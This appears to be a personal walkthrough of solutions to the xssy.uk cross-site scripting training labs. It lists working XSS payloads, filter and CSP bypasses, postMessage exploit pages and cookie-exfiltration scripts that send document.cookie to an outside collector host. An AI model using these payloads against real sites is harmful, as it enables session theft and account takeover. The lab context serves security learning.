# XSS Lab Solutions

Source: https://xssy.uk/allLabs

---

## Novice Level

### Lab 1: Reflected XSS
- **URL Lab**: https://xssy.uk/lab/1
- **Payload**: 
```html
<img src=x onerror=alert(document.cookie)>
```
- **Full URL**: 
```
https://4ua2fzgq.xssy.uk/target.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

---

### Lab 3: DOM XSS
- **URL Lab**: https://xssy.uk/lab/3
- **Payload**: 
```html
<img src=x onerror=alert(document.cookie)>
```
- **Full URL**: 
```
https://7axgjmar.xssy.uk/target.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

---

### Lab 176: Stored XSS
- **URL Lab**: https://xssy.uk/lab/176
- **Payload**: 
```html
</p><img src=x onerror=alert(document.cookie)>
```
- **Full URL**: 
```
https://xn3lrjf6.xssy.uk/target.ftl?name=%3C%2Fp%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E
```

---

### Lab 164: Clientside Validation Bypass
- **URL Lab**: https://xssy.uk/lab/164
- **Payload**: 
```html
fck<svg onload=alert(document.cookie)>
```
- **Full URL**: 
```
https://fygkuqjd.xssy.uk/target.ftl?name=fck%3Csvg%20onload=alert(document.cookie)%3E
```
- **Description**: `<>` blocked if in first character

---

### Lab 10: Script/JavaScript Context XSS
- **URL Lab**: https://xssy.uk/lab/10
- **Payload**: 
```javascript
";alert(document.cookie);//
```
- **Full URL**: 
```
https://66ohqg4u.xssy.uk/target.ftl?name=%22;alert(document.cookie);//
```

---

### Lab 2: Attribute XSS
- **URL Lab**: https://xssy.uk/lab/2
- **Payload**: 
```html
x" autofocus onfocus="alert(document.cookie)
```
- **Full URL**: 
```
https://xonpfky4.xssy.uk/target.ftl?name=x%22%20autofocus%20onfocus=%22alert(document.cookie)
```

---

### Lab 12: Href XSS
- **URL Lab**: https://xssy.uk/lab/12
- **Payload**: 
```javascript
javascript:alert(document.cookie)
```
- **Full URL**: 
```
https://alo5543d.xssy.uk/target.ftl?url=javascript%3Aalert%28document.cookie%29
```

---

### Lab 8: Parameter Name XSS
- **URL Lab**: https://xssy.uk/lab/8
- **Payload**: 
```html
name=<i>bisanih&<i>yakin: <script>alert(document.cookie)</script>
```
- **Full URL**: 
```
https://sh4oxynx.xssy.uk/target.ftl?name=%3Ci%3Ebisanih&%3Ci%3Eyakin:%20%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

---

### Lab 33: POST Reflective XSS | XSS + CSRF
- **URL Lab**: https://xssy.uk/lab/33
- **Payload**: 
```html
<html>
<head><title>POST based xss</title></head>
<body onload="document.forms[0].submit()">
<form action="https://bsu2zcop.xssy.uk/target.ftl" method="POST">Enter your name:
<input type="text" name="name" value="<script>alert(document.cookie)</script>"/>
<input type="submit"/>
</form>
</body>
</html>
```
- **Description**: Host this code to server, when preview, copy the URL link to submit payload

---

### Lab 4: Alert Blocked XSS
- **URL Lab**: https://xssy.uk/lab/4
- **Payload (Unicode Escape)**: 
```html
<script>a\u006cert(document.cookie)</script>
```
- **Full URL**: 
```
https://5s3ucfal.xssy.uk/target.ftl?name=%3Cscript%3Ea\u006cert(document.cookie)%3C/script%3E
```
- **Alternative Technique**: 
```html
<script>window["al"+"ert"](document.cookie)</script>
```

---

### Lab 199: Capture Cookie
- **URL Lab**: https://xssy.uk/lab/199
- **Payload**: 
```javascript
<script>(new Image()).src="https://eqh42jmm.xssy.uk/?cookie"+document.cookie</script>
```
- **Full URL**: 
```
https://ozv4gjit.xssy.uk/target.ftl?name=%3Cscript%3E%28new+Image%28%29%29.src%3D%22https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fcookie%22%2Bdocument.cookie%3C%2Fscript%3E
```
- **Description**: Use `(new Image()).src='attacker.com?cookie='+document.cookie`

---

### Lab 219: Cookie Are Closer
- **URL Lab**: https://xssy.uk/lab/219
- **Payload**: 
```html
</textarea><script>alert(document.domain)</script>
```
- **Full URL**: 
```
https://j3y7iahh.xssy.uk/target.ftl?name=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

---

### Lab 246: Beating encodeURI
- **URL Lab**: https://xssy.uk/lab/246
- **Payload**: 
```javascript
%0A';alert(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101));//
```
- **Description**: If decoded = `\n';alert(document.cookie);//`

---

### Lab 625: File Upload XSS
- **URL Lab**: https://xssy.uk/lab/625
- **Payload (SVG File)**: 
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert(document.cookie);
  </script>
</svg>
```

---

### Lab 764: Understanding DOM
- **URL Lab**: https://xssy.uk/lab/764
- **Payload**: 
```html
<img src=x onerror=alert(document.cookie)>
```
- **Full URL**: 
```
https://ccgq7jee.xssy.uk/target.ftl?search=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

---

### Lab 765: No Brackets
- **URL Lab**: https://xssy.uk/lab/765
- **Payload**: 
```html
<img src=x onerror=alert&#0000000040;document.cookie&#0000000041;>
```
- **Full URL**: 
```
https://c5ryxpyq.xssy.uk/target.ftl?search=%3Cimg+src%3Dx+onerror%3Dalert%26%230000000040%3Bdocument.cookie%26%230000000041%3B%3E
```
- **Description**: Bypass filter `()` via ASCII Decimal

---

### Lab 767: Interpolation
- **URL Lab**: https://xssy.uk/lab/767
- **Payload**: 
```html
dimana" onerror="alert(document.cookie)
```
- **Full URL**: 
```
https://n2kk6q7k.xssy.uk/target.ftl?search=dimana%22%20onerror=%22alert(document.cookie)
```

---

### Lab 769: Click [DOM XSS]
- **URL Lab**: https://xssy.uk/lab/769
- **Payload**: 
```javascript
javascript:alert(document.cookie)#tracker
```
- **Full URL**: 
```
https://se64r6zd.xssy.uk/target.ftl?search=javascript%3Aalert(document.cookie)#tracker
```

---

## Apprentice Level

### Lab 7: Double Decode XSS
- **URL Lab**: https://xssy.uk/lab/7
- **Payload**: 
```html
%3Csvg%20onload%3Dalert(document.cookie)%3E
```
- **Full URL**: 
```
https://vbrnqq5l.xssy.uk/target.ftl?name=%253Csvg%2520onload%253Dalert%28document.cookie%29%253E
```

---

### Lab 19: Brackets Filtered XSS
- **URL Lab**: https://xssy.uk/lab/19
- **Payload**: 
```html
<img src=x onerror=alert&#0000000040;document.cookie&#0000000041;>
```
- **Full URL**: 
```
https://bdls3zqi.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3Dalert%26%230000000040%3Bdocument.cookie%26%230000000041%3B%3E
```

---

### Lab 162: Brackets & Backticks Filtered
- **URL Lab**: https://xssy.uk/lab/162
- **Payload**: 
```html
<img src=x onerror=alert&#0000000040;document.cookie&#0000000041;>
```
- **Full URL**: 
```
https://rtck36fl.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3Dalert%26%230000000040%3Bdocument.cookie%26%230000000041%3B%3E
```

---

### Lab 175: Script Context XSS 2
- **URL Lab**: https://xssy.uk/lab/175
- **Payload**: 
```javascript
";</script><script>alert(document.cookie);//
```
- **Full URL**: 
```
https://q2je5dje.xssy.uk/target.ftl?name=%22;%3C/script%3E%3Cscript%3Ealert(document.cookie);//
```

---

### Lab 178: Stored XSS in User Agent
- **URL Lab**: https://xssy.uk/lab/178
- **Payload**: 
```html
<body onload=alert(document.cookie)>
```
- **Full URL**: 
```
https://xgo4vsgo.xssy.uk/target.ftl?name=%3Cbody+onload%3Dalert%28document.cookie%29%3E
```
- **Description**: Using Burp Suite to intercept request & then add this payload in User-Agent header: `<body onload=alert(document.cookie)>`

---

### Lab 674: File Name XSS
- **URL Lab**: https://xssy.uk/lab/674
- **Reference**: https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-h8hr-jhcx-fcv9
- **Payload**: Intercept request using Burp Suite & change body request:
```http
filename="<img src=x onerror=alert(document.domain)>.svg.png"
Content-Type: application/vnd.ms-excel

<script>alert(document.cookie)</script>
```
- **Submitted URL**: 
```
https://y4vtqelm.xssy.uk/
```
- **Description**: The popup alert triggered in response:
```html
Last file uploaded: <a href="/upload/<img src=x onerror=alert(document.cookie)>.svg.jpg"><img src=x onerror=alert(document.cookie)>.svg.jpg</a></p>
```

---

### Lab 55: Safe HTML Filter [onerror filtered]
- **URL Lab**: https://xssy.uk/lab/55
- **Payload**: 
```html
<iframe srcdoc="<script>alert(document.cookie)</script>">
```
- **Full URL**: 
```
https://js2i6iof.xssy.uk/target.ftl?name=<iframe srcdoc="<script>alert(document.cookie)</script>">
```
- **Description**: Create iframe to bypass filter without event-handler

---

### Lab 170: Large App - Basic XSS
- **URL Lab**: https://xssy.uk/lab/170
- **Payload**: 
```html
<img src=x onerror=alert(document.cookie)>
```
- **Full URL**: 
```
https://jbob7737.xssy.uk/target_37.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

---

### Lab 197: Large App - Non-Sequential
- **URL Lab**: https://xssy.uk/lab/197
- **Payload**: 
```html
<img src=x onerror=alert(document.cookie)>
```
- **Full URL**: 
```
https://g3xd5j3v.xssy.uk/target_54481.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

---

### Lab 9: Mystery Parameter XSS
- **URL Lab**: https://xssy.uk/lab/9
- **Payload**: 
```html
<svg onload=alert(document.cookie)>
```
- **Full URL**: 
```
https://lxxhujqz.xssy.uk/target.ftl?email=<svg onload=alert(document.cookie)>
```
- **Description**: Fuzzing with https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt & got hidden parameter `email`

---

### Lab 18: CSP - Static Nonce Bypass
- **URL Lab**: https://xssy.uk/lab/18
- **Payload**: 
```html
<script nonce="rAnd0m">alert(document.cookie)</script>
```
- **Full URL**: 
```
https://j4phjo6l.xssy.uk/target.ftl?name=%3Cscript%20nonce=%22rAnd0m%22%3Ealert(document.cookie)%3C%2Fscript%3E
```
- **Description**: Because nonce is static, inject the nonce to script

---

### Lab 206: XSS Lead to Unauthorized Action
- **URL Lab**: https://xssy.uk/lab/206
- **Payload**: 
```javascript
<script>window.setTimeout(() => {document.forms[0].submit()}, 500)</script>
```
- **Full URL**: 
```
https://qn4u4nsp.xssy.uk/target.ftl?name=%3Cscript%3Ewindow.setTimeout%28%28%29+%3D%3E+%7Bdocument.forms%5B0%5D.submit%28%29%7D%2C+500%29%3C%2Fscript%3E
```
- **Description**: Instead of trigger alert, escalate impact XSS using code inside JavaScript. When victims click, payload will get `document.forms[0]` & automatically `submit()`. Because we need time to browser load content, we set timeout to wait all content is loaded.

---

### Lab 671: XSS Steal Data via Dangling Markup
- **URL Lab**: https://xssy.uk/lab/671
- **Payload**: 
```html
<img src="https://eqh42jmm.xssy.uk/?
```
- **Full URL**: 
```
https://gigh5vp3.xssy.uk/target.ftl?name=%3Cimg%20src=%22https://eqh42jmm.xssy.uk/?
```
- **Description**: When inject `<i>dimana` the payload appear in HTML: `<p>Hello <i>dimana` but after this sentence, had hidden input that contain flag. Complete code in view page source:
```html
<p>Hello <i>dimana<input type=hidden name=flag value=tuuljg43><input type="hidden"></p>
```
Use dangling markup to steal this flag to server. The flag was found in the log server: `%3Cinput%20type=hidden%20name=flag%20value=4b3p56nm%3E%3Cinput%20type=`

**Note**: CSP blocked custom server:
```
content-security-policy default-src 'self'; img-src https://*.xssy.uk/ https://xssy.uk/; style-src 'unsafe-inline'
```

---

### Lab 678: Dangling Markup Part II
- **URL Lab**: https://xssy.uk/lab/678
- **Payload**: 
```html
<img src='https://eqh42jmm.xssy.uk/?
```
- **Full URL**: 
```
https://a7piuqnq.xssy.uk/target.ftl?name=%3Cimg+src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3F
```
- **Flag**: `tmapchft`
- **Description**: The step is similar like part I

---

### Lab 699: Unlinked
- **URL Lab**: https://xssy.uk/lab/699
- **Status**: Not solved yet

---

### Lab 768: Open Redirect
- **URL Lab**: https://xssy.uk/lab/768
- **Payload**: 
```
https://eqh42jmm.xssy.uk/index.html
```
- **Full URL**: 
```
https://5zrbyrdi.xssy.uk/target.ftl?return=https://eqh42jmm.xssy.uk/index.html
```
- **Description**: Can redirect, but fail to get cookie

---

### Lab 770: Length Limits 5 Characters [We Did It: Bypass]
- **URL Lab**: https://xssy.uk/lab/770
- **Payload**: 
```html
search=<svg>&secret=<animate onbegin=alert(document.cookie)>
```
- **Full URL**: 
```
https://zy4spebe.xssy.uk/target.ftl?search=%3Csvg%3E&secret=%3Canimate%20onbegin=alert(document.cookie)%3E
```
- **Description**: We can only inject 5 characters in search parameter:
```javascript
document.getElementById('tracker').innerHTML = search.substring(0,5);
```
But when inspect the code, found this:
```javascript
var secretSearch = decodeURI(urlParams.get('secret'));
```
Got second parameter name `secret`. First parameter & second parameter are joined in one tag:
```javascript
document.getElementById('tracker').firstChild.innerHTML = clean;
```

---

### Lab 856: Parameter Name 2
- **URL Lab**: https://xssy.uk/lab/856
- **Status**: Not solved yet
- **Description**: Need fuzzing to find hidden parameter. Reference: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt

---

### Lab 1072: The Unfinished Script
- **URL Lab**: https://xssy.uk/lab/1072
- **Payload**: 
```
what<svg\u003E<script\u003E
```
- **Full URL**: 
```
https://dl5kmrls.xssy.uk/target.ftl?name=what%3Csvg\u003E%3Cscript\u003E
```
- **Status**: I have no clue

---

## Adept Level

### Lab 5: Unicode XSS [Using Full-width Character]
- **URL Lab**: https://xssy.uk/lab/5
- **Reference**: https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)#Block
- **Payload**: 
```html
＜img src=x onerror=alert(document.cookie)＞
```
- **Full URL**: 
```
https://4t64ubva.xssy.uk/target.ftl?name=%EF%BC%9Cimg%20src=x%20onerror=alert(document.cookie)%EF%BC%9E
```
- **Description**: Browser will normalize fullwidth character to normal character & we using it to bypass filter/sanitation

---

### Lab 167: Base Tag XSS
- **URL Lab**: https://xssy.uk/lab/167
- **Payload**: Host `app.js` in server as relative path from base, inside `app.js` code:
```javascript
alert(document.cookie)
```
- **Full URL**: 
```
https://xboa2upw.xssy.uk/target.ftl?base=https://eqh42jmm.xssy.uk/app.js&name=dimana
```
- **Description**: Inject myserver.com/app.js to the base parameter. When browser load source from our server it will trigger XSS

---

### Lab 627: Upload Restriction Bypass
- **URL Lab**: https://xssy.uk/lab/627
- **Status**: Not solved yet
- **Description**: Tried change filename, modified filetype, content-type but nothing worked

---

### Lab 637: Sniffing Danger
- **URL Lab**: https://xssy.uk/lab/637
- **Status**: Not solved yet
- **Description**: Tried change filename, modified filetype, content-type but nothing worked

---

### Lab 57: Metadata XSS
- **URL Lab**: https://xssy.uk/lab/57
- **Payload**: Modify image metadata using exiftool. In section model, inject XSS script:
```html
<script>alert(document.cookie)</script>
```
- **Description**: Upload this malicious image XSS to lab. When image uploaded, the lab will pull model name to UI & XSS payload in model metadata triggered

---

### Lab 60: HTML Filter Event Handler [Bypass via Mixed Case Character]
- **URL Lab**: https://xssy.uk/lab/60
- **Payload**: 
```html
<ScRipt>alert(document.cookie)</ScRIpT>
```
- **Full URL**: 
```
https://vtjubozm.xssy.uk/target.ftl?name=%3CScRipt%3Ealert%28document.cookie%29%3C%2FScRIpT%3E
```

---

### Lab 168: HTML Filter - Weak Regex
- **URL Lab**: https://xssy.uk/lab/168
- **Payload (Trojan Horse Technique)**: 
```html
<sc<script>ript>alert(document.cookie)</script>
```
- **Full URL**: 
```
https://fdlv7w2i.xssy.uk/target.ftl?name=%3Csc%3Cscript%3Eript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```
- **Description**: Lab required zero click XSS. First attempt: `</p><a href=javascript:alert(document.cookie)>click` (one-click XSS only). Finally found the technique using trojan horse technique.

---

### Lab 58: PostMessage XSS
- **URL Lab**: https://xssy.uk/lab/58
- **Payload**: 
```html
<body onload="exploit()">   
    <script>
        function exploit() {
            var open = window.open("https://rfm45gxl.xssy.uk/", "exploit");
            window.setTimeout( () => {
                open.postMessage("<img src=x onerror=alert(document.cookie)>", '*')
            }, 1000)
        }
    </script>
    <button onclick="exploit()">exploit</button>
    <iframe name="exploit" />
</body>
```
- **Description**: Learn something new - Bypass popup blocker in browser by Iframe. Because this lab requires zero-click XSS, learned new technique where `<body onload=exploit()>` blocked by browser security, we use iframe. We add `"exploit"` parameter in `window.open()`, when exploit function called by onload instead of open new tab, the URL will opened in iframe `<iframe name="exploit">`. Lab solved by hosting this code to attacker server, when victim opens the link, post-message XSS will triggered.

---

### Lab 679: CSP Bypass - Nonce Predictable Bypass
- **URL Lab**: https://xssy.uk/lab/679
- **Payload**: 
```html
<script nonce="2025-10-25T0905Z">alert(document.cookie)</script>
```
- **Full URL**: 
```
https://yv6x4r7r.xssy.uk/target.ftl?name=%3Cscript+nonce%3D%222025-10-25T0905Z%22%3Ealert%28document.cookie%29%3C%2Fscript%3E
```
- **Description**: When review the CSP directive, nonce value seems like based on time:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src https://xssy.uk/; style-src 'unsafe-inline'; script-src 'nonce-2025-10-25T0905Z'">
```
Use this script to find the nonce value of time:
```javascript
new Date().toISOString().slice(0,16).replace(':','') + 'Z'   // => "2025-10-25T0905Z"
```

---

### Lab 182: CSP - Injection Bypass
- **URL Lab**: https://xssy.uk/lab/182
- **Payload**: 
```
lang=https://eqh42jmm.xssy.uk/alert
name=<script src="https://eqh42jmm.xssy.uk/alert.js"></script>
```
- **Full URL**: 
```
https://2l5dad5g.xssy.uk/target.ftl?lang=https://eqh42jmm.xssy.uk/alert&name=<script src="https://eqh42jmm.xssy.uk/alert.js"></script>
```
- **Description**: Hosted code `alert(document.cookie)` to https://eqh42jmm.xssy.uk/alert.js. Because `lang=https://eqh42jmm.xssy.uk/alert.js` already has `.js` automatically, only input `https://eqh42jmm.xssy.uk/alert` to modify CSP to whitelist this URL. Then in parameter `name`, inject payload XSS via `<script src="https://eqh42jmm.xssy.uk/alert.js"></script>` that was hosted & whitelisted to bypass CSP.

---

### Lab 181: CSP - Data URI Bypass
- **URL Lab**: https://xssy.uk/lab/181
- **Payload**: 
```html
<script src="data:text/javascript,alert(document.cookie)"></script>
```
- **Full URL**: 
```
https://6cpdhsai.xssy.uk/target.ftl?name=%3Cscript%20src%3D%22data%3Atext%2Fjavascript%2Calert%2528document.cookie%2529%22%3E%3C%2Fscript%3E
```
- **Description**: The protection: only can load script-src from `'data'`. Need to URL encode.

---

### Lab 173: JSONP Bypass
- **URL Lab**: https://xssy.uk/lab/173
- **Payload**: 
```html
<script src="jsonp.ftl?callback=alert(document.cookie)"></script>
```
- **Full URL**: 
```
https://thnxclxd.xssy.uk/target.ftl?name=%3Cscript%20src=%22jsonp.ftl?callback=alert(document.cookie)%22%3E%3C/script%3E
```
- **Description**: When inspect element, found script contain JSONP endpoint. Use this endpoint to bypass CSP. Script contain JSONP: `<script src="jsonp.ftl?callback=print"></script>`

---

### Lab 628: Upload CSP Bypass
- **URL Lab**: https://xssy.uk/lab/628
- **Status**: Not solved yet

---

### Lab 179: Enctype Spoofing
- **URL Lab**: https://xssy.uk/lab/179
- **Status**: Not solved yet

---

### Lab 640: CSP Exfiltration
- **URL Lab**: https://xssy.uk/lab/640
- **Payload**: 
```javascript
<script>
var meta = document.createElement('meta');
meta.httpEquiv = 'refresh';
meta.content = '0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;
document.head.appendChild(meta);
</script>
```
- **Full URL (need encode URL before submit)**: 
```
https://pzcihwu2.xssy.uk/target.ftl?name=<script>var meta = document.createElement('meta');meta.httpEquiv = 'refresh';meta.content = '0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta);</script>
```
- **Flag**: `zsunagkx`
- **Description**: Learn something about CSP Bypass via navigation technique. Use `location.assign` to exfiltrate cookie & bypass CSP `default-src: none` that means `connect-src` is `'none'` also.

**Alternative Payloads**:
```javascript
<script>location.assign("//eqh42jmm.xssy.uk?cookie="+document.cookie)</script>
<script>window.location='https://eqh42jmm.xssy.uk/?c='+document.cookie;</script>
```

---

### Lab 736: Referer Check
- **URL Lab**: https://xssy.uk/lab/736
- **Payload**: 
```html
<img src=x onerror="alert(document.cookie)">
```
- **Full URL**: 
```
https://m3ult5ii.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3D%22alert%28document.cookie%29%22%3E
```
- **Description**: Switch parameter name from body to URL request

---

### Lab 882: Template
- **URL Lab**: https://xssy.uk/lab/882
- **Payload**: 
```
${alert(document.cookie)}
```
- **Full URL**: 
```
https://uxookccd.xssy.uk/target.ftl?name=${alert(document.cookie)}
```
- **Description**: First tested `<i>dimana` and the character `<` was filtered. Based on title, used template to trigger XSS. FreeMarker template uses syntax `${...}` for expression.

---

### Lab 1068: Shallow Obscurity [Code in Script Was Obfuscated]
- **URL Lab**: https://xssy.uk/lab/1068
- **Payload**: 
```html
#<iframe src=javascript:alert&lpar;document.cookie&rpar;>
```
- **Full URL**: 
```
https://fku2gvhv.xssy.uk/#%3Ciframe%20src=javascript:alert&lpar;document.cookie&rpar;%3E
```
- **Description**: Used ChatGPT to deobfuscate code:
```javascript
window.addEventListener('hashchange', function() { 
    var input = window.location.hash.slice(1); // Ambil setelah # 
    var decoded = decodeURIComponent(input); // Filter XSS sederhana 
    decoded = decoded.replace(/[()]/g, ''); // Hapus tanda kurung 
    decoded = decoded.replace(/onerror/gi, ''); // Hapus "onerror" 
    // VULNERABLE! Output langsung ke innerHTML 
    document.getElementById('output').innerHTML = 'huh!: ' + decoded; 
});
```

---

## Expert Level

### Lab 626: HTML Upload Blocked
- **URL Lab**: https://xssy.uk/lab/626
- **Status**: Not solved yet

---

### Lab 638: Polyglot XSS
- **URL Lab**: https://xssy.uk/lab/638
- **Status**: Not solved yet

---

### Lab 677: Null Byte Injection
- **URL Lab**: https://xssy.uk/lab/677
- **Status**: Not solved yet

---

### Lab 11: Overlong UTF-8 XSS
- **URL Lab**: https://xssy.uk/lab/11
- **Payload**: 
```
%C0%BCscript%C0%BEalert(document.cookie)%C0%BC/script%C0%BE
```
- **Full URL**: 
```
https://7fj3bijv.xssy.uk/target.ftl?name=%C0%BCscript%C0%BEalert(document.cookie)%C0%BC/script%C0%BE
```

---

### Lab 191: Split Payload
- **URL Lab**: https://xssy.uk/lab/191
- **Status**: Not solved yet

---

### Lab 201: HttpOnly Bypass
- **URL Lab**: https://xssy.uk/lab/201
- **Status**: Not solved yet

---

### Lab 207: UPPERCASE
- **URL Lab**: https://xssy.uk/lab/207
- **Reference**: https://hackerone.com/reports/1167034
- **Payload**: 
```html
</p><CBoDy oOnLoAnLoAd=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\143\157\157\153\151\145\51")()>
```
- **Full URL**: 
```
https://ez27zilh.xssy.uk/target.ftl?name=%3C/p%3E%3CBoDy%20oOnLoAnLoAd=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\143\157\157\153\151\145\51")()%3E
```
- **Description**: 
  - Step 1: Bypass onload filter => `oOnLoAnLoAd`
  - Step 2: Encode `[]["filter"]["constructor"]("alert(document.cookie)")()` with ASCII Octal => `[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\143\157\157\153\151\145\51")()`

---

### Lab 214: Href XSS 2
- **URL Lab**: https://xssy.uk/lab/214
- **Payload**: 
```
https://eqh42jmm.xssy.uk/
```
- **Full URL**: 
```
https://sh5efuuc.xssy.uk/target.ftl?url=https%3A%2F%2Feqh42jmm.xssy.uk%2F
```

---

### Lab 215: WebSocket XSS
- **URL Lab**: https://xssy.uk/lab/215
- **Status**: Not solved yet

---

### Lab 220: Unscripted
- **URL Lab**: https://xssy.uk/lab/220
- **Status**: Not solved yet

---

### Lab 738: Referer & Origin Check
- **URL Lab**: https://xssy.uk/lab/738
- **Status**: Not solved yet

---

### Lab 775: Integrity Policy
- **URL Lab**: https://xssy.uk/lab/775
- **Status**: Not solved yet

---

### Lab 857: URL DOM XSS
- **URL Lab**: https://xssy.uk/lab/857
- **Status**: Not solved yet

---

### Lab 884: Templates 2
- **URL Lab**: https://xssy.uk/lab/884
- **Status**: Not solved yet

---

## Master Level

### Lab 6: Unicode XSS 2
- **URL Lab**: https://xssy.uk/lab/6
- **Payload**: 
```
%0D%0A%CC%B8 onfocus="alert(document.cookie)" autofocus>
```
- **Full URL**: 
```
https://ozb2apmi.xssy.uk/target.ftl?name=%0D%0A%CC%B8+onfocus%3D%22alert%28document.cookie%29%22+autofocus%3E
```

---

### Lab 59: PostMessage 2 [Learning New]
- **URL Lab**: https://xssy.uk/lab/59
- **Target URL**: https://e3nwaisk.xssy.uk/
- **Payload**: 
```html
<body onload="exploit()">
    <script>
      function exploit() {
        var open = window.open("https://e3nwaisk.xssy.uk/", "exploit");
        window.setTimeout(() => {
          open.postMessage("https://e3nwaisk.xssy.uk/", "*");
          window.setTimeout(() => {
            open.postMessage("javascript:alert(document.cookie)", "*");
          }, 500);
        }, 500);
      }
    </script>
    <iframe name="exploit" />
</body>
```
- **Description**: If blocked because different origin postMessage, can use redirect loop in postMessage. Example:
  1. `window.open` https://e3nwaisk.xssy.uk/
  2. `setTimeout` redirect again to https://e3nwaisk.xssy.uk/
  3. Because https://e3nwaisk.xssy.uk/ & https://e3nwaisk.xssy.uk/ same origin, step 3 inject payload succeeds
  4. Inject payload: `open.postMessage("javascript:alert(document.cookie)", "*");`

---

## Summary Statistics

### Solved Labs by Level:
- **Novice Level**: 18/18 labs documented
- **Apprentice Level**: 17/20 labs solved
- **Adept Level**: 16/22 labs solved  
- **Expert Level**: 2/14 labs solved
- **Master Level**: 2/2 labs documented

### Key Techniques Learned:
1. **Encoding Bypasses**: Unicode, Full-width characters, ASCII Decimal/Octal, Double encoding
2. **CSP Bypasses**: Static nonce, Predictable nonce, JSONP, Data URI, Injection bypass, Navigation technique
3. **Filter Bypasses**: Mixed case, Trojan horse, Unicode escape, String concatenation
4. **Advanced XSS**: PostMessage, Dangling markup, Template injection, Metadata XSS
5. **Context-specific**: DOM XSS, Stored XSS, Reflected XSS, File upload XSS
6. **Event Handlers**: onerror, onload, onfocus, onbegin
7. **Cookie Exfiltration**: Image source, Location redirect, Meta refresh

